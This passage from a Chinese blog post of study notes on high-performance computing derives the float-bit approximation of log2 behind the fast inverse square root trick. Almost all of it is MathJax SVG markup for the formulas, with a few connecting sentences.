115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(23201,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(23867.8,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mi" transform="translate(24923.5,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(25826.8,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msub" transform="translate(26827,0)"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(28541.5,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mi" transform="translate(28708.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(29502.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(30502.7,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(31405.9,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mo" transform="translate(32406.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(32795.1,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(33776.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(34776.5,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(35347.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 乘L相当于向左移23位。通过调节 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.292ex" height="1ex" role="img" focusable="false" viewBox="0 -431 571 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g></g></g></svg></mjx-container></span>，可以使得这个近似非常精确。</p>
<img lazyload="" src="/images/loading.svg" data-src="/blog/2025/03/15/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%952/approx.svg" class="">
<p>从上述公式我们可以反解出<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.546ex;" xmlns="http://www.w3.org/2000/svg" width="5.55ex" height="2.116ex" role="img" focusable="false" viewBox="0 -694 2453.2 935.4"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1714.6,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mi" transform="translate(1881.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>
<span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="21.962ex" height="4.627ex" role="img" focusable="false" viewBox="0 -1359 9707.1 2045"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z"></path><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)"></path><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)"></path></g><g data-mml-node="mn" transform="translate(1311,-241.4) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1714.6,0)"><path data-c="2061" d=""></path></g><g data-mml-node="mi" transform="translate(1881.2,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(2731,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mfrac" transform="translate(3786.8,0)"><g data-mml-node="msub" transform="translate(220,676)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mi" transform="translate(343.2,-686)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><rect width="1127.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(5376.5,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(6376.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6765.7,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(7746.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(8747.1,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(9318.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>
现在我们已经在数学上证明了这个快速的算法，我们还可以进一步推导，设 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.334ex;" xmlns="http://www.w3.org/2000/svg" width="7.401ex" height="3.291ex" role="img" focusable="false" viewBox="0 -864.9 3271.2 1454.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(1823.6,0)"><g data-mml-node="mn" transform="translate(547,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="msqrt" transform="translate(220,-436.1) scale(0.707)"><g transform="translate(853,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mo" transform="translate(0,-34.6)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="572" height="42.4" x="853" y="723"></rect></g><rect width="1207.6" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span>，我们可以代入上述推导出来的公式中： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.148ex;" xmlns="http://www.w3.org/2000/svg" width="36.892ex" height="5.428ex" role="img" focusable="false" viewBox="0 -1449.5 16306.3 2399"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="msub" transform="translate(220,755)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mi" transform="translate(314.2,-686)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 